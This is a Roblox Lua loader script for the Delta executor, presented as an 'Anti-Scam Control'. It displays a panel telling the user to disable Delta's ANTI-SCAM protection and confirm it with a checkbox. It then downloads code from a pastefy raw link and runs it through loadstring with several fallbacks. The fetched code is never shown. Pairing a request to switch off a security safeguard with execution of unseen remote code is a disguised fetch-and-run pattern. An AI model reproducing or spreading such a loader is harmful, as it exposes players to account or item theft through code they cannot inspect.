--[[ Delta Anti-Scam Control (robust loader)
   - Fetch fallback chain: syn.request -> http_request/request -> game:HttpGet -> HttpService:GetAsync
   - Compile fallback: syn.loadstring -> loadstring -> load
   - Fixed label click handling
]]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

-- ===== helpers =====
local function http_fetch(url)
	-- executors with request()
	local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
	if req then
		local r = req({Url = url, Method = "GET"})
		local body = r and (r.Body or r.body)
		if not body or (r.StatusCode and r.StatusCode >= 400) then
			error("request() failed: "..tostring(r and r.StatusCode))
		end
		return body
	end
	-- game:HttpGet (executor-provided)
	if typeof(game.HttpGet) == "function" then
		return game:HttpGet(url)
	end
	-- Roblox HttpService (Studio with HttpEnabled)
	return HttpService:GetAsync(url)
end

local function compile_chunk(src)
	if syn and syn.loadstring then
		local f, e = syn.loadstring(src)
		if not f then error(e) end
		return f
	end
	if loadstring then
		local f, e = loadstring(src)
		if not f then error(e) end
		return f
	end
	if load then
		local f, e = load(src)
		if not f then error(e) end
		return f
	end
	error("No loadstring/load available in this environment")
end

-- ===== UI =====
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DeltaAntiScamControl"
screenGui.ResetOnSpawn = false
screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 240, 0, 227)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

-- Banner
local bannerFrame = Instance.new("Frame")
bannerFrame.Name = "BannerFrame"
bannerFrame.Size = UDim2.new(1, 0, 0, 50)
bannerFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
bannerFrame.BorderSizePixel = 0
bannerFrame.Parent = mainFrame

local bannerImage = Instance.new("ImageLabel")
bannerImage.Name = "BannerImage"
bannerImage.Size = UDim2.new(1, 0, 1, 0)
bannerImage.BackgroundTransparency = 1
bannerImage.Image = "rbxassetid://97145606658615"
bannerImage.ScaleType = Enum.ScaleType.Crop
bannerImage.Parent = bannerFrame

local bannerCorner = Instance.new("UICorner")
bannerCorner.CornerRadius = UDim.new(0, 8)
bannerCorner.Parent = bannerFrame

-- Profile
local profileFrame = Instance.new("Frame")
profileFrame.Name = "ProfileFrame"
profileFrame.Size = UDim2.new(0, 80, 0, 40)
profileFrame.Position = UDim2.new(0, 10, 0.5, 0)
profileFrame.AnchorPoint = Vector2.new(0, 0.5)
profileFrame.BackgroundTransparency = 1
profileFrame.Parent = bannerFrame

local profileIcon = Instance.new("ImageLabel")
profileIcon.Name = "ProfileIcon"
profileIcon.Size = UDim2.new(0, 30, 0, 30)
profileIcon.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
profileIcon.BorderSizePixel = 0
profileIcon.Image = "rbxassetid://86022856415884"
profileIcon.Parent = profileFrame

local profileIconStroke = Instance.new("UIStroke")
profileIconStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
profileIconStroke.Color = Color3.fromRGB(0, 0, 0)
profileIconStroke.Thickness = 2
profileIconStroke.Parent = profileIcon

local profileIconCorner = Instance.new("UICorner")
profileIconCorner.CornerRadius = UDim.new(1, 0)
profileIconCorner.Parent = profileIcon

local usernameLabel = Instance.new("TextLabel")
usernameLabel.Name = "Username"
usernameLabel.Size = UDim2.new(0, 150, 0, 20)
usernameLabel.Position = UDim2.new(0, 35, 0, 5)
usernameLabel.BackgroundTransparency = 1
usernameLabel.Text = "DELTA USER"
usernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
usernameLabel.Font = Enum.Font.GothamBold
usernameLabel.TextSize = 12
usernameLabel.TextXAlignment = Enum.TextXAlignment.Left
usernameLabel.Parent = profileFrame

-- Title
local titleText = Instance.new("TextLabel")
titleText.Name = "TitleText"
titleText.Size = UDim2.new(1, -20, 0, 30)
titleText.Position = UDim2.new(0, 10, 0, 60)
titleText.BackgroundTransparency = 1
titleText.Text = "DISABLE ANTI-SCAM"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.Font = Enum.Font.GothamBold
titleText.TextSize = 14
titleText.TextXAlignment = Enum.TextXAlignment.Center
titleText.Parent = mainFrame

-- Warning
local warningText = Instance.new("TextLabel")
warningText.Name = "WarningText"
warningText.Size = UDim2.new(1, -20, 0, 60)
warningText.Position = UDim2.new(0, 10, 0, 95)
warningText.BackgroundTransparency = 1
warningText.Text = "Disable ANTI-SCAM in Delta settings to ensure proper code functionality"
warningText.TextColor3 = Color3.fromRGB(255, 150, 150)
warningText.TextWrapped = true
warningText.Font = Enum.Font.Gotham
warningText.TextSize = 12
warningText.TextXAlignment = Enum.TextXAlignment.Center
warningText.Parent = mainFrame

-- Checkbox
local checkboxFrame = Instance.new("Frame")
checkboxFrame.Size = UDim2.new(1, -20, 0, 30)
checkboxFrame.Position = UDim2.new(0, 10, 0, 165)
checkboxFrame.BackgroundTransparency = 1
checkboxFrame.Parent = mainFrame

local checkbox = Instance.new("TextButton")
checkbox.Size = UDim2.new(0, 20, 0, 20)
checkbox.Position = UDim2.new(0, 0, 0, 5)
checkbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
checkbox.Text = ""
checkbox.Parent = checkboxFrame

local checkboxInner = Instance.new("Frame")
checkboxInner.Size = UDim2.new(0, 14, 0, 14)
checkboxInner.Position = UDim2.new(0, 3, 0, 3)
checkboxInner.BackgroundColor3 = Color3.fromRGB(30, 136, 229)
checkboxInner.Visible = false
checkboxInner.Parent = checkbox

local checkboxLabel = Instance.new("TextLabel")
checkboxLabel.Size = UDim2.new(0, 150, 0, 20)
checkboxLabel.Position = UDim2.new(0, 25, 0, 5)
checkboxLabel.BackgroundTransparency = 1
checkboxLabel.Text = "I already disabled ANTI SCAM"
checkboxLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
checkboxLabel.Font = Enum.Font.Gotham
checkboxLabel.TextSize = 12
checkboxLabel.TextXAlignment = Enum.TextXAlignment.Left
checkboxLabel.Parent = checkboxFrame

-- Let the label also toggle via input (TextLabel has no MouseButton1Click)
checkboxLabel.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		checkbox:Activate() -- triggers MouseButton1Click visuals
		checkboxInner.Visible = not checkboxInner.Visible
		if checkboxInner.Visible then
			proceedButton.BackgroundColor3 = Color3.fromRGB(30, 136, 229)
			proceedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		else
			proceedButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
			proceedButton.TextColor3 = Color3.fromRGB(150, 150, 150)
		end
	end
end)

-- Proceed button
local proceedButton = Instance.new("TextButton")
proceedButton.Size = UDim2.new(0, 120, 0, 30)
proceedButton.Position = UDim2.new(0.5, 0, 1, -10)
proceedButton.AnchorPoint = Vector2.new(0.5, 1)
proceedButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60) -- Disabled look
proceedButton.Text = "PROCEED"
proceedButton.TextColor3 = Color3.fromRGB(150, 150, 150)
proceedButton.Font = Enum.Font.GothamBold
proceedButton.TextSize = 14
proceedButton.AutoButtonColor = true
proceedButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 4)
buttonCorner.Parent = proceedButton

-- Checkbox toggle via box
local function toggleCheckbox()
	checkboxInner.Visible = not checkboxInner.Visible
	if checkboxInner.Visible then
		proceedButton.BackgroundColor3 = Color3.fromRGB(30, 136, 229)
		proceedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	else
		proceedButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
		proceedButton.TextColor3 = Color3.fromRGB(150, 150, 150)
	end
end
checkbox.MouseButton1Click:Connect(toggleCheckbox)

-- Proceed
local function onProceed()
	if not checkboxInner.Visible then
		warn("You must tick the checkbox before proceeding!")
		return
	end

	proceedButton.Text = "EXECUTING..."
	task.wait(0.2)

	local url = "https://pastefy.app/RNHiaCoe/raw"

	-- fetch
	local src
	local okFetch, fetchErr = pcall(function()
		src = http_fetch(url)
	end)
	if not okFetch then
		proceedButton.Text = "FETCH FAILED"
		proceedButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
		warn("[Loader] HTTP error: "..tostring(fetchErr))
		return
	end
	if not src or #src == 0 then
		proceedButton.Text = "EMPTY SCRIPT"
		proceedButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
		warn("[Loader] Got empty response from URL")
		return
	end

	-- compile + run
	local okRun, runErr = pcall(function()
		local chunk = compile_chunk(src)
		return chunk()
	end)

	if okRun then
		proceedButton.Text = "COMPLETED"
		proceedButton.BackgroundColor3 = Color3.fromRGB(76, 175, 80)
		print("[Loader] Loadstring executed successfully!")
	else
		proceedButton.Text = "EXEC ERROR"
		proceedButton.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
		warn("[Loader] Execution failed: "..tostring(runErr))
	end
end
proceedButton.MouseButton1Click:Connect(onProceed)

print("Delta Anti-Scam Control UI loaded.")
